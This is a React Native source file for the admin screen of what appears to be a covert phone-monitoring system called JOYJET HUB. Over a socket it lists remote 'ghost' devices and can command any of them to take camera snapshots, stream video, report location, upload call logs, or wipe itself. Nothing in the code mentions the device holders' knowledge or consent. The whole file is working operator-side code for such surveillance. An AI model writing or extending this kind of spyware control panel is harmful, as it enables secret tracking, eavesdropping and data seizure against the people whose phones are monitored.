import React, { useState, useEffect, useRef } from 'react';
import { View, ScrollView, StyleSheet, Text, Vibration, SafeAreaView, StatusBar, TouchableOpacity, ActivityIndicator, Alert } from 'react-native';
import { MaterialCommunityIcons } from '@expo/vector-icons';
import { captureRef } from 'react-native-view-shot';
import * as MediaLibrary from 'expo-media-library';
import socket from '../services/socket';

// Import Child Components
import StatusCard from '../components/StatusCard';
import VideoFeed from '../components/VideoFeed';
import LogConsole from '../components/LogConsole';
import TacticalMap from '../components/TacticalMap';
import SnapshotGallery from '../components/SnapshotGallery';
import CallLogViewer from '../components/CallLogViewer';

const AdminScreen = ({ onLogout, name }) => {
  const [ghosts, setGhosts] = useState({});
  const [logs, setLogs] = useState([]);
  const [selectedGhostId, setSelectedGhostId] = useState(null);
  const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, CALLS, LOGS
  const viewRef = useRef();

  const selectedGhost = selectedGhostId ? ghosts[selectedGhostId] : null;

  useEffect(() => {
    socket.on('heartbeat_update', (data) => {
      setGhosts(prev => ({ 
        ...prev, 
        [data.name]: { ...prev[data.name], ...data, lastSeen: Date.now() } 
      }));
    });
    
    socket.on('status_report', (data) => {
      console.log("[Admin] Received Status Report", data);
      const initialGhosts = {};
      data.nodes.forEach(node => {
        initialGhosts[node.name] = { name: node.name, status: 'CONNECTED', lastSeen: Date.now() };
      });
      setGhosts(prev => ({ ...prev, ...initialGhosts }));
    });

    socket.on('system_alert', (data) => {
      setLogs(prev => [...prev, { 
        type: 'SYSTEM', 
        message: data.msg || 'ALERT', 
        timestamp: new Date().toLocaleTimeString() 
      }].slice(-50));
    });

    // Request full status on entry
    socket.emit('get_status');
    setLogs(prev => [...prev, { 
      type: 'SYSTEM', 
      message: 'COMMAND CENTER INITIALIZED. SCANNING NODES...', 
      timestamp: new Date().toLocaleTimeString() 
    }]);

    socket.on('log_update', (newLog) => {
      const logWithTime = {
        ...newLog,
        timestamp: newLog.timestamp || new Date().toLocaleTimeString()
      };
      setLogs(prev => [...prev, logWithTime].slice(-50));
      if (newLog.type === 'ERROR') Vibration.vibrate([0, 150, 100, 150]); 
    });

    socket.on('ghost_activity', (payload) => {
      if (payload.type === 'SNAPSHOT') {
        setGhosts(prev => ({
          ...prev,
          [payload.name]: {
            ...prev[payload.name],
            snapshots: [{ id: Date.now().toString(), uri: payload.data, timestamp: new Date().toLocaleTimeString() }, ...(prev[payload.name]?.snapshots || [])]
          }
        }));
        setLogs(prev => [...prev, { 
          type: 'SYSTEM', 
          message: `SNAPSHOT RECEIVED FROM ${payload.name}`, 
          timestamp: new Date().toLocaleTimeString() 
        }]);
      } else if (payload.type === 'LOG_SYNC') {
        setGhosts(prev => ({
          ...prev,
          [payload.name]: {
            ...prev[payload.name],
            callLogs: payload.data
          }
        }));
        setLogs(prev => [...prev, { 
          type: 'SYSTEM', 
          message: `TELEMETRY SYNCED FROM ${payload.name}`, 
          timestamp: new Date().toLocaleTimeString() 
        }]);
      }
    });

    return () => {
      socket.off('heartbeat_update');
      socket.off('log_update');
      socket.off('ghost_activity');
      socket.off('status_report');
      socket.off('system_alert');
    };
  }, []);

  const sendCommand = (target, cmd) => {
    socket.emit('admin_command', { targetId: target, cmd });
    Vibration.vibrate(50);
  };

  const getFormattedTimestamp = () => {
    const now = new Date();
    const pad = (n) => n.toString().padStart(2, '0');
    return `${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}_${pad(now.getDate())}${pad(now.getMonth() + 1)}${now.getFullYear().toString().slice(-2)}`;
  };

  const captureLocalView = async () => {
    try {
      const { status } = await MediaLibrary.requestPermissionsAsync();
      if (status !== 'granted') {
        Alert.alert("Permission", "Storage access required to save screenshot.");
        return;
      }

      const uri = await captureRef(viewRef, {
        format: 'jpg',
        quality: 0.8,
      });

      const nodeInfo = selectedGhost ? selectedGhost.name.replace(/[^a-z0-9]/gi, '_').toUpperCase() : 'NONE';
      const filename = `DASHBOARD_${nodeInfo}_${getFormattedTimestamp()}.jpg`;
      
      const asset = await MediaLibrary.createAssetAsync(uri);
      await MediaLibrary.createAlbumAsync('JOYJET_SCREENSHOTS', asset, false);
      
      Vibration.vibrate([0, 50, 50, 50]);
      Alert.alert("DASHBOARD CAPTURED", `Manifest: ${filename}`);
    } catch (e) {
      console.error("Local capture failed", e);
      Alert.alert("Error", "Dashboard capture failed.");
    }
  };

  return (
    <SafeAreaView style={styles.container} ref={viewRef} collapsable={false}>
      <StatusBar barStyle="light-content" />
      
      <View style={styles.header}>
        <View style={{ flexDirection: 'row', alignItems: 'center' }}>
          <Text style={styles.headerTitle}>JOYJET HUB / COMMAND CENTER</Text>
          <TouchableOpacity style={{ marginLeft: 15 }} onPress={captureLocalView}>
            <MaterialCommunityIcons name="camera-plus-outline" size={20} color="#00ff00" />
          </TouchableOpacity>
        </View>
        <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
          <Text style={styles.logoutTxt}>[ LOGOUT ]</Text>
        </TouchableOpacity>
      </View>

      {/* GHOST SELECTOR */}
      <View style={styles.selectorContainer}>
        <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.selectorScroll}>
          {Object.values(ghosts).length === 0 ? (
            <Text style={styles.emptyText}>NO ACTIVE NODES DETECTED</Text>
          ) : (
            Object.values(ghosts).map((ghost) => (
              <TouchableOpacity 
                key={ghost.name} 
                style={[
                  styles.selectorChip, 
                  selectedGhostId === ghost.name && styles.selectorChipActive,
                  ghost.status === 'OFFLINE' && styles.selectorChipOffline
                ]}
                onPress={() => setSelectedGhostId(ghost.name)}
              >
                <View style={[styles.dot, ghost.status === 'CONNECTED' ? styles.dotGreen : (ghost.status === 'OFFLINE' ? styles.dotRed : styles.dotOrange)]} />
                <Text style={[
                  styles.selectorText, 
                  selectedGhostId === ghost.name && styles.selectorTextActive,
                  ghost.status === 'OFFLINE' && styles.selectorTextOffline
                ]}>
                  {ghost.name?.split('_').pop()?.toUpperCase() || 'NODE'}
                </Text>
              </TouchableOpacity>
            ))
          )}
        </ScrollView>
      </View>

      {selectedGhost ? (
        <>
          {/* TAB NAVIGATION */}
          <View style={styles.tabBar}>
            <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.tabScroll}>
              {['FEED', 'MAP', 'SNAPS', 'CALLS', 'LOGS'].map(tab => (
                <TouchableOpacity 
                  key={tab} 
                  style={[styles.tab, activeTab === tab && styles.tabActive]}
                  onPress={() => setActiveTab(tab)}
                >
                  <Text style={[styles.tabText, activeTab === tab && styles.tabTextActive]}>{tab}</Text>
                </TouchableOpacity>
              ))}
            </ScrollView>
          </View>

          {/* TAB CONTENT */}
          <ScrollView style={styles.content}>
            <View style={styles.ghostInfoHead}>
              <Text style={styles.ghostIdText}>GHOST :: {selectedGhost.name.toUpperCase()}</Text>
              <Text style={styles.vitals}>{selectedGhost.battery || '--'}</Text>
            </View>

            {activeTab === 'FEED' && (
              <View style={styles.tabSection}>
                <VideoFeed ghostName={selectedGhost.name} adminName={name} />
                <View style={styles.controls}>
                  <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
                    <MaterialCommunityIcons name="camera-iris" size={18} color="#00ff00" style={{ marginRight: 10 }} />
                    <Text style={styles.btnTxt}>TRIGGER CAPTURE</Text>
                  </TouchableOpacity>
                  <TouchableOpacity style={[styles.btn, styles.wipeBtn]} onPress={() => sendCommand(selectedGhost.name, 'WIPE')}>
                    <MaterialCommunityIcons name="skull-outline" size={18} color="#ff4444" style={{ marginRight: 10 }} />
                    <Text style={styles.wipeBtnTxt}>EMERGENCY WIPE</Text>
                  </TouchableOpacity>
                </View>
              </View>
            )}

            {activeTab === 'MAP' && (
              <View style={styles.tabSection}>
                <TacticalMap location={selectedGhost.location} ghostName={selectedGhost.name} />
                <View style={styles.controls}>
                  <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'PING')}>
                    <Text style={styles.btnTxt}>FORCED LOCATE</Text>
                  </TouchableOpacity>
                </View>
              </View>
            )}

            {activeTab === 'SNAPS' && (
              <View style={styles.tabSection}>
                <SnapshotGallery ghostName={selectedGhost.name} snapshots={selectedGhost.snapshots || []} />
                <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
                  <MaterialCommunityIcons name="camera-plus" size={18} color="#00ff00" style={{ marginRight: 10 }} />
                  <Text style={styles.btnTxt}>NEW REMOTE CAPTURE</Text>
                </TouchableOpacity>
              </View>
            )}

            {activeTab === 'CALLS' && (
              <View style={styles.tabSection}>
                <CallLogViewer logs={selectedGhost.callLogs || []} />
                <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'LOG_SYNC')}>
                  <Text style={styles.btnTxt}>SYNC TELEMETRY</Text>
                </TouchableOpacity>
              </View>
            )}

            {activeTab === 'LOGS' && (
              <View style={styles.tabSection}>
                <LogConsole logs={logs.filter(l => l.message.includes(selectedGhost.name) || l.type === 'SYSTEM')} />
              </View>
            )}
          </ScrollView>
        </>
      ) : (
        <View style={styles.initOverlay}>
          <ActivityIndicator color="#00ff00" size="large" />
          <Text style={styles.initText}>SELECT A GHOST NODE TO INITIALIZE STREAM</Text>
          <LogConsole logs={logs} />
        </View>
      )}
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000' },
  header: { paddingVertical: 15, paddingHorizontal: 20, flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
  headerTitle: { color: '#fff', fontSize: 10, letterSpacing: 5 },
  logoutBtn: { paddingHorizontal: 12, paddingVertical: 4, borderWidth: 0.5, borderColor: '#ff4444', borderRadius: 3 },
  logoutTxt: { color: '#ff4444', fontSize: 7, letterSpacing: 2 },
  
  // Ghost Selector
  selectorContainer: { backgroundColor: '#080808', borderBottomWidth: 1, borderBottomColor: '#111' },
  selectorScroll: { padding: 10, gap: 10 },
  selectorChip: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 15, paddingVertical: 8, backgroundColor: '#000', borderWidth: 1, borderColor: '#222', borderRadius: 20 },
  selectorChipActive: { borderColor: '#00ff00', backgroundColor: '#00ff0011' },
  selectorText: { color: '#444', fontSize: 10, fontWeight: 'bold' },
  selectorTextActive: { color: '#00ff00' },
  dot: { width: 6, height: 6, borderRadius: 3, marginRight: 8 },
  dotGreen: { backgroundColor: '#00ff00' },
  dotOrange: { backgroundColor: '#ffaa00' },
  dotRed: { backgroundColor: '#ff4444' },
  selectorChipOffline: { borderColor: '#333', opacity: 0.5 },
  selectorTextOffline: { color: '#333' },
  emptyText: { color: '#222', fontSize: 9, letterSpacing: 2, padding: 5 },

  // Tabs
  tabBar: { backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
  tabScroll: { flexDirection: 'row' },
  tab: { paddingHorizontal: 20, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
  tabActive: { borderBottomColor: '#00ff00' },
  tabText: { color: '#444', fontSize: 9, fontWeight: 'bold', letterSpacing: 1 },
  tabTextActive: { color: '#00ff00' },

  // Content
  content: { flex: 1 },
  ghostInfoHead: { flexDirection: 'row', justifyContent: 'space-between', padding: 15, backgroundColor: '#020202' },
  ghostIdText: { color: '#666', fontSize: 10, fontWeight: 'bold' },
  vitals: { color: '#00ff00', fontSize: 10, fontWeight: 'bold' },
  tabSection: { padding: 15 },
  sectionLabel: { color: '#333', fontSize: 9, fontWeight: 'bold', marginBottom: 15, letterSpacing: 1 },
  
  // Controls
  controls: { marginTop: 15, gap: 10 },
  btn: { width: '100%', height: 48, borderWidth: 1, borderColor: '#00ff00', flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 4, backgroundColor: '#00ff0005' },
  btnTxt: { color: '#00ff00', fontSize: 10, fontWeight: 'bold', letterSpacing: 2 },
  wipeBtn: { borderColor: '#ff4444', backgroundColor: '#ff444405' },
  wipeBtnTxt: { color: '#ff4444', fontSize: 10, fontWeight: 'bold', letterSpacing: 2 },
  
  // Placeholders
  snapPlaceholder: { height: 200, backgroundColor: '#030303', borderWidth: 1, borderColor: '#111', borderRadius: 5, justifyContent: 'center', alignItems: 'center', marginBottom: 15 },
  placeholderText: { color: '#111', fontSize: 10, fontWeight: 'bold' },

  // Init State
  initOverlay: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
  initText: { color: '#222', fontSize: 9, fontWeight: 'bold', letterSpacing: 2, marginTop: 20, marginBottom: 40, textAlign: 'center' }
});

export default AdminScreen;
